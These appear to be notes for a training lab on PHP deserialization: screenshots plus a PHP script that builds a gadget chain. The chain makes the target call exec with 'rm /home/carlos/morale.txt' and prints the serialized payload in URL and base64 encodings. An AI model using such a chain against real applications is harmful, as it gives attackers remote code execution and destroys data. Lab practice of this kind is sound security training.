# EXPERT: Developing a custom gadget chain for PHP deserialization

![Снимок экрана 2025-12-03 в 14.36.57.png](EXPERT%20Developing%20a%20custom%20gadget%20chain%20for%20PHP%20de/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_14.36.57.png)

![Снимок экрана 2025-12-03 в 14.38.07.png](EXPERT%20Developing%20a%20custom%20gadget%20chain%20for%20PHP%20de/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_14.38.07.png)

![Снимок экрана 2025-12-03 в 14.40.23.png](EXPERT%20Developing%20a%20custom%20gadget%20chain%20for%20PHP%20de/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_14.40.23.png)

![Снимок экрана 2025-12-03 в 14.43.30.png](EXPERT%20Developing%20a%20custom%20gadget%20chain%20for%20PHP%20de/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_14.43.30.png)

```python
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

// Create the malicious gadget chain
function create_malicious_gadget() {
    // Create a DefaultMap object with exec as callback
    $defaultMap = new DefaultMap('exec');
    
    // Create CustomTemplate with the command as default_desc_type
    // Note: We need to set desc to our DefaultMap object
    $customTemplate = new CustomTemplate();
    
    // Use reflection to set private properties
    $reflectionClass = new ReflectionClass('CustomTemplate');
    
    // Set default_desc_type to the command we want to execute
    $defaultDescTypeProperty = $reflectionClass->getProperty('default_desc_type');
    $defaultDescTypeProperty->setAccessible(true);
    $defaultDescTypeProperty->setValue($customTemplate, 'rm /home/carlos/morale.txt');
    
    // Set desc to our DefaultMap object
    $descProperty = $reflectionClass->getProperty('desc');
    $descProperty->setAccessible(true);
    $descProperty->setValue($customTemplate, $defaultMap);
    
    // Serialize the malicious object
    $serialized = serialize($customTemplate);
    
    // Since __sleep() only returns ["default_desc_type", "desc"], 
    // the product property won't be serialized
    echo "Serialized Payload:\n";
    echo urlencode($serialized) . "\n\n";
    echo "Base64 encoded:\n";
    echo base64_encode($serialized) . "\n\n";
    
    return $serialized;
}

echo create_malicious_gadget();

?>
```

![Снимок экрана 2025-12-03 в 14.49.26.png](EXPERT%20Developing%20a%20custom%20gadget%20chain%20for%20PHP%20de/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_14.49.26.png)

![Снимок экрана 2025-12-03 в 14.52.11.png](EXPERT%20Developing%20a%20custom%20gadget%20chain%20for%20PHP%20de/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_14.52.11.png)

![Снимок экрана 2025-12-03 в 14.52.24.png](EXPERT%20Developing%20a%20custom%20gadget%20chain%20for%20PHP%20de/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_14.52.24.png)